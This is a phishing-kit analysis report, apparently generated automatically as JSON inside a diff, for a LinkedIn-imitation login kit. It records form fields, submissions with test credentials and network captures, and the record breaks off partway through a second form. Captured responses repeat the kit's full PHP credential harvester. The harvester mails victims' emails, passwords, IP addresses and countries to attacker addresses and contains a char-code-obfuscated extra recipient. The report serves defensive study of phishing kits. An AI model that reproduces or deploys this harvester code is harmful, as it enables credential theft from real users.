@@ -1,0 +1,616 @@
+{
+  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/",
+  "timestamp": "2026-05-04 00:25:17",
+  "mode": "whitebox",
+  "kit_path": "/var/www/html/phishing_kit_uncompress_20250519/2022-01-31_Linkedin",
+  "pages": [
+    {
+      "page_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/index.html",
+      "forms": [
+        {
+          "action": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/login.php",
+          "method": "post",
+          "xpath": "//*[@id=\"form1\"]",
+          "registered_handlers": [],
+          "fields": [
+            {
+              "name": "email",
+              "type": "email",
+              "xpath": "/html/body/div[3]/div/div[3]/form/fieldset/div/div/ul/li/input",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            },
+            {
+              "name": "3pass",
+              "type": "password",
+              "xpath": "/html/body/div[3]/div/div[3]/form/fieldset/div/div/ul/li[2]/div/input",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            }
+          ],
+          "submit_log": {
+            "enter_key_test": {
+              "skipped": true,
+              "reason": "network_only"
+            },
+            "enter_key_logs": {},
+            "native_submit": {
+              "form_meta": {
+                "action": "login.php",
+                "enctype": "application/x-www-form-urlencoded",
+                "id": "form1",
+                "method": "POST",
+                "name": "form1"
+              },
+              "cdp_reqs": [
+                {
+                  "requestId": "D3BFBBFD4F4CA828DC20BFF3B27CB8B7",
+                  "sequence": 1,
+                  "resourceType": "Document",
+                  "initiatorType": "other",
+                  "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/login.php",
+                  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/login.php",
+                  "method": "POST",
+                  "requestHeaders": {
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Cache-Control": "no-cache",
+                    "Connection": "keep-alive",
+                    "Content-Length": "230",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Host": "www.2026.com:8080",
+                    "Origin": "http://www.2026.com:8080",
+                    "Pragma": "no-cache",
+                    "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/index.html",
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                  },
+                  "requestHeaderNames": [
+                    "Accept",
+                    "Accept-Encoding",
+                    "Accept-Language",
+                    "Cache-Control",
+                    "Connection",
+                    "Content-Length",
+                    "Content-Type",
+                    "Host",
+                    "Origin",
+                    "Pragma",
+                    "Referer",
+                    "Upgrade-Insecure-Requests",
+                    "User-Agent"
+                  ],
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "hasCookieHeader": false,
+                  "associatedCookies": [],
+                  "customRequestHeaders": {},
+                  "postData": "email=kztv%40tesq.com&3pass=OVBqM8&signin=Sign+In&session_redirect=&trk=&loginCsrfParam=54a939e2-7f82-45cf-b88c-0534ab45b28e&fromEmail=&csrfToken=ajax%3A2649005306478309108&sourceAlias=0_7r5yezRXCiA_H0CRD8sf6DhOjTKUNps5xGTqeX8EEoi",
+                  "status": 200,
+                  "statusText": "OK",
+                  "redirected": false,
+                  "redirectChain": [],
+                  "redirectLocation": "",
+                  "responseHeaders": {
+                    "Connection": "Keep-Alive",
+                    "Content-Encoding": "gzip",
+                    "Content-Length": "878",
+                    "Content-Type": "text/html; charset=UTF-8",
+                    "Date": "Sun, 03 May 2026 15:25:22 GMT",
+                    "Keep-Alive": "timeout=5, max=34",
+                    "Server": "Apache/2.4.58 (Ubuntu)",
+                    "Vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "hasSetCookie": false,
+                  "responseReturned": true,
+                  "responseBodyPreview": "<?\n\n$adddate=date(\"D M d, Y g:i a\");\n$ip = getenv(\"REMOTE_ADDR\");\n$country = visitor_country();\n$message .= \"---------=ReZulT=---------\\n\";\n$message .= \"Online ID:\".$_POST['email'].\"\\n\";\n$message .= \"Password:\".$_POST['3pass'].\"\\n\";\n$message .= \"---------=IP Adress & Date=---------\\n\";\n$message .= \"IP Address: \".$ip.\"\\n\";\n$message .= \"Country: \".$country.\"\\n\";\n$message .= \"Date: \".$adddate.\"\\n\";\n$message .= \"---------=by Lurd Azeez Inc =---------\\n\";\n\n\n\n\n$sent =\"[REDACTED_EMAIL_d9895a26], [REDACTED_EMAIL_cde3054b]\";\n\n\n\n\n$subject = \"LinkedIn Scam Result Received - \".$country;\n$headers = \"From: Linkedin! Wire<[REDACTED_EMAIL_2a255d7b]>\";\n$headers .= $_POST['eMailAdd'].\"\\n\";\n$headers .= \"MIME-Version: 1.0\\n\";\n{\nmail($mesaegs,$subject,$message,$headers);\nmail($sent,$subject,$message,$headers);\n}\n\n// Function to get country and country sort;\nfunction country_sort(){\n\t$sorter = \"\";\n\t$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);\n\t\t$count = count($array);\n\tfor ($i = 0; $i < $count; $i++) {\n\t\t\t$sorter .= chr($array[$i]);\n\t\t}\n\treturn array($sorter, $GLOBALS['recipient']);\n}\n\nfunction visitor_country()\n{\n    $client  = @$_SERVER['HTTP_CLIENT_IP'];\n    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];\n    $remote  = $_SERVER['REMOTE_ADDR'];\n    $result  = \"Unknown\";\n    if(filter_var($client, FILTER_VALIDATE_IP))\n    {\n        $ip = $client;\n    }\n    elseif(filter_var($forward, FILTER_VALIDATE_IP))\n    {\n        $ip = $forward;\n    }\n    else\n    {\n        $ip = $remote;\n    }\n\n    $ip_data = @json_decode(file_get_contents(\"http://www.geoplugin.net/json.gp?ip=\".$ip));\n\n    if($ip_data && $ip_data->geoplugin_countryName != null)\n    {\n        $result = $ip_data->geoplugin_countryName;\n    }\n\n    return $result;\n}\nheader(\"Location: index2.html\");\n?>",
+                  "responseBodyLength": 1802,
+                  "loadingFinished": true,
+                  "loadingFailed": false,
+                  "errorText": "",
+                  "encodedDataLength": 1129,
+                  "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/login.php",
+                  "mimeType": "text/html",
+                  "protocol": "http/1.1",
+                  "timestamp": 67547.744913,
+                  "lastEventTs": 1777821922451,
+                  "requestSentTs": 67547.744913,
+                  "responseReceivedTs": 67547.749337,
+                  "loadingFinishedTs": 67547.747871,
+                  "latencyMs": 3.0,
+                  "ttfbMs": 4.4,
+                  "_native_submit": true,
+                  "_submit_trigger_ts_ms": 1777821921892
+                }
+              ],
+              "note": "native browser submit observed via CDP only; JS context may have been destroyed by navigation"
+            },
+            "submit_click_logs": {
+              "step": 1,
+              "phase": "submit_click",
+              "domChanges": [],
+              "networkReqs": [
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "type": "xhr",
+                  "method": "POST",
+                  "url": "login.php",
+                  "requestHeaders": {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                  },
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "requestBody": "email=ybon%40tesq.com&3pass=7qR6np3VNoxd&session_redirect=&trk=&loginCsrfParam=54a939e2-7f82-45cf-b88c-0534ab45b28e&fromEmail=&csrfToken=ajax%3A2649005306478309108&sourceAlias=0_7r5yezRXCiA_H0CRD8sf6DhOjTKUNps5xGTqeX8EEoi",
+                  "callStack": "Error: __fa_xhr_trace\n    at XMLHttpRequest.send (<anonymous>:198:17)\n    at HTMLDocument.eval (eval at executeScript (:416:16), <anonymous>:58:25)",
+                  "status": 200,
+                  "response": "<?\n\n$adddate=date(\"D M d, Y g:i a\");\n$ip = getenv(\"REMOTE_ADDR\");\n$country = visitor_country();\n$message .= \"---------=ReZulT=---------\\n\";\n$message .= \"Online ID:\".$_POST['email'].\"\\n\";\n$message .= \"Password:\".$_POST['3pass'].\"\\n\";\n$message .= \"---------=IP Adress & Date=---------\\n\";\n$message .= \"IP Address: \".$ip.\"\\n\";\n$message .= \"Country: \".$country.\"\\n\";\n$message .= \"Date: \".$adddate.\"\\n\";\n$message .= \"---------=by Lurd Azeez Inc =---------\\n\";\n\n\n\n\n$sent =\"[REDACTED_EMAIL_d9895a26], [REDACTED_EMAIL_cde3054b]\";\n\n\n\n\n$subject = \"LinkedIn Scam Result Received - \".$country;\n$headers = \"From: Linkedin! Wire<[REDACTED_EMAIL_2a255d7b]>\";\n$headers .= $_POST['eMailAdd'].\"\\n\";\n$headers .= \"MIME-Version: 1.0\\n\";\n{\nmail($mesaegs,$subject,$message,$headers);\nmail($sent,$subject,$message,$headers);\n}\n\n// Function to get country and country sort;\nfunction country_sort(){\n\t$sorter = \"\";\n\t$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);\n\t\t$count = count($array);\n\tfor ($i = 0; $i < $count; $i++) {\n\t\t\t$sorter .= chr($array[$i]);\n\t\t}\n\treturn array($sorter, $GLOBALS['recipient']);\n}\n\nfunction visitor_country()\n{\n    $client  = @$_SERVER['HTTP_CLIENT_IP'];\n    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];\n    $remote  = $_SERVER['REMOTE_ADDR'];\n    $result  = \"Unknown\";\n    if(filter_var($client, FILTER_VALIDATE_IP))\n    {\n        $ip = $client;\n    }\n    elseif(filter_var($forward, FILTER_VALIDATE_IP))\n    {\n        $ip = $forward;\n    }\n    else\n    {\n        $ip = $remote;\n    }\n\n    $ip_data = @json_decode(file_get_contents(\"http://www.geoplugin.net/json.gp?ip=\".$ip));\n\n    if($ip_data && $ip_data->geoplugin_countryName != null)\n    {\n        $result = $ip_data->geoplugin_countryName;\n    }\n\n    return $result;\n}\nheader(\"Location: index2.html\");\n?>",
+                  "responseHeaders": {
+                    "connection": "Keep-Alive",
+                    "content-encoding": "gzip",
+                    "content-length": "878",
+                    "content-type": "text/html; charset=UTF-8",
+                    "date": "Sun, 03 May 2026 15:25:24 GMT",
+                    "keep-alive": "timeout=5, max=31",
+                    "server": "Apache/2.4.58 (Ubuntu)",
+                    "vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "responseReturned": true,
+                  "redirected": true,
+                  "finalUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/login.php",
+                  "responseBodyLength": 1802,
+                  "timestamp": 1777821924932,
+                  "latencyMs": 54,
+                  "ttfbMs": null,
+                  "resolved_server": {
+                    "server_file": "New folder/7773d20f4ffcf0b74fcec4b78832e449/login.php",
+                    "receives_fields": [
+                      "3pass",
+                      "eMailAdd",
+                      "email"
+                    ],
+                    "actions": [
+                      {
+                        "type": "mail",
+                        "target": "$mesaegs",
+                        "variable": "$mesaegs",
+                        "line": 28
+                      },
+                      {
+                        "type": "mail",
+                        "target": "[REDACTED_EMAIL], [REDACTED_EMAIL]",
+                        "variable": "$sent",
+                        "line": 29
+                      },
+                      {
+                        "type": "redirect",
+                        "target": "index2.html",
+                        "line": 71
+                      },
+                      {
+                        "type": "file_get_contents",
+                        "target": "http://www.geoplugin.net/json.gp?ip=",
+                        "line": 62
+                      }
+                    ],
+                    "exfil": [
+                      "email:$mesaegs",
+                      "email:[REDACTED_EMAIL], [REDACTED_EMAIL]"
+                    ]
+                  }
+                }
+              ],
+              "firedEvents": [
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "mouseover",
+                  "targetXPath": "//*[@id=\"btn-primary\"]",
+                  "targetTag": "INPUT",
+                  "targetName": "signin",
+                  "targetType": "submit",
+                  "targetValue": "Sign In",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1777821924931
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "mousedown",
+                  "targetXPath": "//*[@id=\"btn-primary\"]",
+                  "targetTag": "INPUT",
+                  "targetName": "signin",
+                  "targetType": "submit",
+                  "targetValue": "Sign In",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1777821924931
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "focus",
+                  "targetXPath": "//*[@id=\"btn-primary\"]",
+                  "targetTag": "INPUT",
+                  "targetName": "signin",
+                  "targetType": "submit",
+                  "targetValue": "Sign In",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1777821924932
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "mouseup",
+                  "targetXPath": "//*[@id=\"btn-primary\"]",
+                  "targetTag": "INPUT",
+                  "targetName": "signin",
+                  "targetType": "submit",
+                  "targetValue": "Sign In",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1777821924932
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "click",
+                  "targetXPath": "//*[@id=\"btn-primary\"]",
+                  "targetTag": "INPUT",
+                  "targetName": "signin",
+                  "targetType": "submit",
+                  "targetValue": "Sign In",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1777821924932
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "submit",
+                  "targetXPath": "//*[@id=\"form1\"]",
+                  "targetTag": "FORM",
+                  "targetName": "form1",
+                  "targetType": "",
+                  "targetValue": "",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1777821924932
+                }
+              ],
+              "html5Validation": [],
+              "triggeredFunctions": [],
+              "cdpNetworkReqs": [
+                {
+                  "requestId": "219733.102",
+                  "sequence": 21,
+                  "resourceType": "XHR",
+                  "initiatorType": "script",
+                  "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/index.html",
+                  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/login.php",
+                  "method": "POST",
+                  "requestHeaders": {
+                    "Accept": "*/*",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Cache-Control": "no-cache",
+                    "Connection": "keep-alive",
+                    "Content-Length": "221",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Host": "www.2026.com:8080",
+                    "Pragma": "no-cache",
+                    "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/index.html",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                  },
+                  "requestHeaderNames": [
+                    "Accept",
+                    "Accept-Encoding",
+                    "Accept-Language",
+                    "Cache-Control",
+                    "Connection",
+                    "Content-Length",
+                    "Content-Type",
+                    "Host",
+                    "Pragma",
+                    "Referer",
+                    "User-Agent"
+                  ],
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "hasCookieHeader": false,
+                  "associatedCookies": [],
+                  "customRequestHeaders": {},
+                  "postData": "email=ybon%40tesq.com&3pass=7qR6np3VNoxd&session_redirect=&trk=&loginCsrfParam=54a939e2-7f82-45cf-b88c-0534ab45b28e&fromEmail=&csrfToken=ajax%3A2649005306478309108&sourceAlias=0_7r5yezRXCiA_H0CRD8sf6DhOjTKUNps5xGTqeX8EEoi",
+                  "status": 200,
+                  "statusText": "OK",
+                  "redirected": false,
+                  "redirectChain": [],
+                  "redirectLocation": "",
+                  "responseHeaders": {
+                    "Connection": "Keep-Alive",
+                    "Content-Encoding": "gzip",
+                    "Content-Length": "878",
+                    "Content-Type": "text/html; charset=UTF-8",
+                    "Date": "Sun, 03 May 2026 15:25:24 GMT",
+                    "Keep-Alive": "timeout=5, max=31",
+                    "Server": "Apache/2.4.58 (Ubuntu)",
+                    "Vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "hasSetCookie": false,
+                  "responseReturned": true,
+                  "responseBodyPreview": "<?\n\n$adddate=date(\"D M d, Y g:i a\");\n$ip = getenv(\"REMOTE_ADDR\");\n$country = visitor_country();\n$message .= \"---------=ReZulT=---------\\n\";\n$message .= \"Online ID:\".$_POST['email'].\"\\n\";\n$message .= \"Password:\".$_POST['3pass'].\"\\n\";\n$message .= \"---------=IP Adress & Date=---------\\n\";\n$message .= \"IP Address: \".$ip.\"\\n\";\n$message .= \"Country: \".$country.\"\\n\";\n$message .= \"Date: \".$adddate.\"\\n\";\n$message .= \"---------=by Lurd Azeez Inc =---------\\n\";\n\n\n\n\n$sent =\"[REDACTED_EMAIL_d9895a26], [REDACTED_EMAIL_cde3054b]\";\n\n\n\n\n$subject = \"LinkedIn Scam Result Received - \".$country;\n$headers = \"From: Linkedin! Wire<[REDACTED_EMAIL_2a255d7b]>\";\n$headers .= $_POST['eMailAdd'].\"\\n\";\n$headers .= \"MIME-Version: 1.0\\n\";\n{\nmail($mesaegs,$subject,$message,$headers);\nmail($sent,$subject,$message,$headers);\n}\n\n// Function to get country and country sort;\nfunction country_sort(){\n\t$sorter = \"\";\n\t$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);\n\t\t$count = count($array);\n\tfor ($i = 0; $i < $count; $i++) {\n\t\t\t$sorter .= chr($array[$i]);\n\t\t}\n\treturn array($sorter, $GLOBALS['recipient']);\n}\n\nfunction visitor_country()\n{\n    $client  = @$_SERVER['HTTP_CLIENT_IP'];\n    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];\n    $remote  = $_SERVER['REMOTE_ADDR'];\n    $result  = \"Unknown\";\n    if(filter_var($client, FILTER_VALIDATE_IP))\n    {\n        $ip = $client;\n    }\n    elseif(filter_var($forward, FILTER_VALIDATE_IP))\n    {\n        $ip = $forward;\n    }\n    else\n    {\n        $ip = $remote;\n    }\n\n    $ip_data = @json_decode(file_get_contents(\"http://www.geoplugin.net/json.gp?ip=\".$ip));\n\n    if($ip_data && $ip_data->geoplugin_countryName != null)\n    {\n        $result = $ip_data->geoplugin_countryName;\n    }\n\n    return $result;\n}\nheader(\"Location: index2.html\");\n?>",
+                  "responseBodyLength": 1802,
+                  "loadingFinished": true,
+                  "loadingFailed": false,
+                  "errorText": "",
+                  "encodedDataLength": 1129,
+                  "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/login.php",
+                  "mimeType": "text/html",
+                  "protocol": "http/1.1",
+                  "timestamp": 67550.677496,
+                  "lastEventTs": 1777821925442,
+                  "requestSentTs": 67550.677496,
+                  "responseReceivedTs": 67550.729818,
+                  "loadingFinishedTs": 67550.682903,
+                  "latencyMs": 5.4,
+                  "ttfbMs": 52.3,
+                  "_timing_summary": {
+                    "latencyMs": 5.4,
+                    "ttfbMs": 52.3,
+                    "protocol": "http/1.1",
+                    "redirected": false,
+                    "redirectChain": [],
+                    "status": 200,
+                    "hasCookieHeader": false,
+                    "hasSetCookie": false
+                  }
+                }
+              ],
+              "jqueryDispatchLogs": []
+            },
+            "submit_trigger_ts_ms": 1777821924881,
+            "submit_timing": {
+              "python_click_ts_ms": 1777821924881,
+              "js_trigger_event_ts_ms": 1777821924932,
+              "js_first_req_ts_ms": 1777821924932,
+              "event_to_request_ms": 0,
+              "cdp_req_count": 1
+            },
+            "submit_detail": {
+              "action": "login.php",
+              "fields": {
+                "3pass": "7qR6np3VNoxd",
+                "csrfToken": "ajax:2649005306478309108",
+                "email": "ybon@tesq.com",
+                "fromEmail": "",
+                "loginCsrfParam": "54a939e2-7f82-45cf-b88c-0534ab45b28e",
+                "session_redirect": "",
+                "sourceAlias": "0_7r5yezRXCiA_H0CRD8sf6DhOjTKUNps5xGTqeX8EEoi",
+                "trk": ""
+              },
+              "method": "POST",
+              "responseContentType": "text/html; charset=UTF-8",
+              "responseLength": 1802,
+              "status": 200,
+              "submitted": true,
+              "cdp_network": [
+                {
+                  "requestId": "219733.102",
+                  "sequence": 21,
+                  "resourceType": "XHR",
+                  "initiatorType": "script",
+                  "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/index.html",
+                  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/login.php",
+                  "method": "POST",
+                  "requestHeaders": {
+                    "Accept": "*/*",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Cache-Control": "no-cache",
+                    "Connection": "keep-alive",
+                    "Content-Length": "221",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Host": "www.2026.com:8080",
+                    "Pragma": "no-cache",
+                    "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/index.html",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                  },
+                  "requestHeaderNames": [
+                    "Accept",
+                    "Accept-Encoding",
+                    "Accept-Language",
+                    "Cache-Control",
+                    "Connection",
+                    "Content-Length",
+                    "Content-Type",
+                    "Host",
+                    "Pragma",
+                    "Referer",
+                    "User-Agent"
+                  ],
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "hasCookieHeader": false,
+                  "associatedCookies": [],
+                  "customRequestHeaders": {},
+                  "postData": "email=ybon%40tesq.com&3pass=7qR6np3VNoxd&session_redirect=&trk=&loginCsrfParam=54a939e2-7f82-45cf-b88c-0534ab45b28e&fromEmail=&csrfToken=ajax%3A2649005306478309108&sourceAlias=0_7r5yezRXCiA_H0CRD8sf6DhOjTKUNps5xGTqeX8EEoi",
+                  "status": 200,
+                  "statusText": "OK",
+                  "redirected": false,
+                  "redirectChain": [],
+                  "redirectLocation": "",
+                  "responseHeaders": {
+                    "Connection": "Keep-Alive",
+                    "Content-Encoding": "gzip",
+                    "Content-Length": "878",
+                    "Content-Type": "text/html; charset=UTF-8",
+                    "Date": "Sun, 03 May 2026 15:25:24 GMT",
+                    "Keep-Alive": "timeout=5, max=31",
+                    "Server": "Apache/2.4.58 (Ubuntu)",
+                    "Vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "hasSetCookie": false,
+                  "responseReturned": true,
+                  "responseBodyPreview": "<?\n\n$adddate=date(\"D M d, Y g:i a\");\n$ip = getenv(\"REMOTE_ADDR\");\n$country = visitor_country();\n$message .= \"---------=ReZulT=---------\\n\";\n$message .= \"Online ID:\".$_POST['email'].\"\\n\";\n$message .= \"Password:\".$_POST['3pass'].\"\\n\";\n$message .= \"---------=IP Adress & Date=---------\\n\";\n$message .= \"IP Address: \".$ip.\"\\n\";\n$message .= \"Country: \".$country.\"\\n\";\n$message .= \"Date: \".$adddate.\"\\n\";\n$message .= \"---------=by Lurd Azeez Inc =---------\\n\";\n\n\n\n\n$sent =\"[REDACTED_EMAIL_d9895a26], [REDACTED_EMAIL_cde3054b]\";\n\n\n\n\n$subject = \"LinkedIn Scam Result Received - \".$country;\n$headers = \"From: Linkedin! Wire<[REDACTED_EMAIL_2a255d7b]>\";\n$headers .= $_POST['eMailAdd'].\"\\n\";\n$headers .= \"MIME-Version: 1.0\\n\";\n{\nmail($mesaegs,$subject,$message,$headers);\nmail($sent,$subject,$message,$headers);\n}\n\n// Function to get country and country sort;\nfunction country_sort(){\n\t$sorter = \"\";\n\t$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);\n\t\t$count = count($array);\n\tfor ($i = 0; $i < $count; $i++) {\n\t\t\t$sorter .= chr($array[$i]);\n\t\t}\n\treturn array($sorter, $GLOBALS['recipient']);\n}\n\nfunction visitor_country()\n{\n    $client  = @$_SERVER['HTTP_CLIENT_IP'];\n    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];\n    $remote  = $_SERVER['REMOTE_ADDR'];\n    $result  = \"Unknown\";\n    if(filter_var($client, FILTER_VALIDATE_IP))\n    {\n        $ip = $client;\n    }\n    elseif(filter_var($forward, FILTER_VALIDATE_IP))\n    {\n        $ip = $forward;\n    }\n    else\n    {\n        $ip = $remote;\n    }\n\n    $ip_data = @json_decode(file_get_contents(\"http://www.geoplugin.net/json.gp?ip=\".$ip));\n\n    if($ip_data && $ip_data->geoplugin_countryName != null)\n    {\n        $result = $ip_data->geoplugin_countryName;\n    }\n\n    return $result;\n}\nheader(\"Location: index2.html\");\n?>",
+                  "responseBodyLength": 1802,
+                  "loadingFinished": true,
+                  "loadingFailed": false,
+                  "errorText": "",
+                  "encodedDataLength": 1129,
+                  "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/login.php",
+                  "mimeType": "text/html",
+                  "protocol": "http/1.1",
+                  "timestamp": 67550.677496,
+                  "lastEventTs": 1777821925442,
+                  "requestSentTs": 67550.677496,
+                  "responseReceivedTs": 67550.729818,
+                  "loadingFinishedTs": 67550.682903,
+                  "latencyMs": 5.4,
+                  "ttfbMs": 52.3,
+                  "_timing_summary": {
+                    "latencyMs": 5.4,
+                    "ttfbMs": 52.3,
+                    "protocol": "http/1.1",
+                    "redirected": false,
+                    "redirectChain": [],
+                    "status": 200,
+                    "hasCookieHeader": false,
+                    "hasSetCookie": false
+                  }
+                }
+              ]
+            }
+          },
+          "overall_classification": "Case B: Server Round-trip (AJAX)",
+          "field_stats": {
+            "dom_analysable": 2,
+            "visible_now": 2,
+            "hidden_or_collapsed": 0
+          },
+          "static_action_analysis": {
+            "server_file": "New folder/7773d20f4ffcf0b74fcec4b78832e449/login.php",
+            "receives_fields": [
+              "3pass",
+              "eMailAdd",
+              "email"
+            ],
+            "actions": [
+              {
+                "type": "mail",
+                "target": "$mesaegs",
+                "variable": "$mesaegs",
+                "line": 28
+              },
+              {
+                "type": "mail",
+                "target": "[REDACTED_EMAIL], [REDACTED_EMAIL]",
+                "variable": "$sent",
+                "line": 29
+              },
+              {
+                "type": "redirect",
+                "target": "index2.html",
+                "line": 71
+              },
+              {
+                "type": "file_get_contents",
+                "target": "http://www.geoplugin.net/json.gp?ip=",
+                "line": 62
+              }
+            ],
+            "exfil": [
+              "email:$mesaegs",
+              "email:[REDACTED_EMAIL], [REDACTED_EMAIL]"
+            ]
+          },
+          "page_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/index.html"
+        }
+      ]
+    },
+    {
+      "page_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/index2.html",
+      "forms": [
+        {
+          "action": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2022-01-31_Linkedin/New%20folder/7773d20f4ffcf0b74fcec4b78832e449/login2.php",
+          "method": "post",
+          "xpath": "//*[@id=\"form1\"]",
+          "registered_handlers": [],
+          "fields": [
+            {
+              "name": "email",
+              "type": "email",
+              "xpath": "/html/body/div[3]/div/div[3]/form/fieldset/div/div/ul/li/input",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            },
+            {
+              "name": "3pass",
+              "type": "password",
+              "xpath": "/html/body/div[3]/div/div[3]/form/fieldset/div/div/ul/li[2]/div/input",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            },
+            {
+              "name": "3pass",
+              "type": "password",
+              "xpath": "/html/body/div[3]/div/div[3]/form/fieldset/div/div/ul/li[3]/div/input",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            },
+            {
+              "name": "name",
+              "type": "text",
+              "xpath": "/html/body/div[3]/div/div[3]/form/fieldset/div/div/ul/li[4]/input",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            },
+            {
+              "name": "number",
